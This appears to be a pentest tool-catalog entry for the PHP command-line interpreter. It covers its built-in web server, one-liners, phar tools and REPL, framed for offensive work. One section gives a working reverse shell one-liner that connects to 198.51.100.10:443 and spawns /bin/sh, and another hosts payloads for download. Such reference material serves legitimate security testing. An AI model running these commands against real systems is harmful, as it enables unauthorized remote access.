---
name: "php"
categories:
  - web
version: "8.5.12-3"
homepage: "https://www.php.net/"
origin: "arch"
arch-repo: "extra"
packaged-by: [arch, kali, nixpkgs]
arch-builddate: "2026-11-02"
build-system: autotools
license: PHP-3.01
meta-checked: "2026-11-09"
github-repo: "php/php-src"
github-stars: 41770
github-pushed: "2026-11-09"
github-archived: false
github-issues: 2321
github-match: "exact"
gh-checked: "2026-11-09"
worth: 9.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 6443
gh-activity-checked: "2026-11-09"
---

# php

> General-purpose scripting language whose CLI binary doubles as an offensive workhorse: instant web server, code-execution one-liners, and the runtime for exploit scripts and .phar tools.

*Corpus-grounded (built-in web server hosting, `-r` one-liners, helper-script and phar execution patterns); flags verified against the PHP manual's command-line options reference.*

## What it's for

This is the PHP interpreter itself, not a security tool. In practice it earns a place in a pentest toolkit in three ways: `php -S` stands up a working HTTP server in any directory in one command (payload hosting, serving a cloned site, catching exfil over HTTP); `php -r` executes arbitrary PHP without writing a file, which covers quick base64/hex decoding, hashing, file inspection and reverse shells on hosts that ship PHP; and the plain `php script.php` form runs the many single-file exploit helpers, key generators and .phar-packaged utilities that circulate as PHP source. It does nothing offensive by itself — the value is that the binary is present nearly everywhere PHP apps run, including on compromised targets. `php -v`, `php -m` and `php --ini` are the quick triage commands for version, loaded extensions and configuration paths.

## Typical use cases

### Stand up an instant web server to serve payloads

```
php -S 0.0.0.0:8000 -t /srv/payloads
```

Outcome: the built-in development server starts and serves `/srv/payloads` over HTTP on port 8000 (banner: `PHP x.y.z Development Server started`); any file dropped in the docroot becomes downloadable from the target. Omit `-t` to serve the current directory, and bind `127.0.0.1:port` instead when the server should only be reachable through a tunnel. A PHP file name placed after the address (e.g. `php -S 0.0.0.0:8000 index.php`) is used as a router script that every request passes through.

### Fire a reverse shell one-liner on a PHP host

```
php -r '$sock=fsockopen("198.51.100.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Outcome: connects back to the listener on 198.51.100.10:443 and pipes an interactive `/bin/sh` over the socket; start the matching `nc -lvnp 443` first. Works when a command-execution path exists but writing a file to disk is undesirable.

### Decode or inspect data with a one-liner

```
php -r 'print(file_get_contents("php://filter/convert.base64-decode/resource=encoded.txt"));'
```

Outcome: decodes the base64 body of `encoded.txt` and prints it, without creating temp files. Any PHP stream wrapper is fair game here — the same pattern reads `data://`, `expect://` or chained `php://filter/...` resources, and functions like `print_r(getimagesize($f))` quickly verify what a suspect uploaded file really is.

### Run a local exploit-helper script

```
php -f generate.php > merge.log
```

Outcome: executes the PHP script in the current directory (`-f` is optional — plain `php generate.php` is equivalent) and, here, captures its output in `merge.log`. Single-file helpers for key generation, decryption or payload serialization are typically run exactly this way, often feeding their output straight into another command with a pipe.

### Run a .phar-packaged tool

```
php magescan.phar scan:all http://target.example.com
```

Outcome: executes the PHP archive as a program with its own subcommands, same as any scanner CLI. Many PHP security tools ship as a single `.phar` file, so the interpreter is the only dependency needed to run them.

### Build a phar archive with phar.readonly disabled

```
php -d phar.readonly=0 build_phar.php
```

Outcome: runs the archive-building script with the INI entry `phar.readonly` set to `0` for this process only, allowing `new Phar(...)`/`Phar::buildFromDirectory()` to write the archive. Without `-d` (or the long `--define`) the creation step fails, since `phar.readonly` defaults to on.

### Drop into the interactive shell

```
php -a
```

Outcome: starts an interactive REPL (`php >` prompt) where snippets can be tested line by line before being folded into a one-liner or script; `exit` leaves. Useful for working out exact serialization/encryption behavior against the local interpreter before running it against a target.
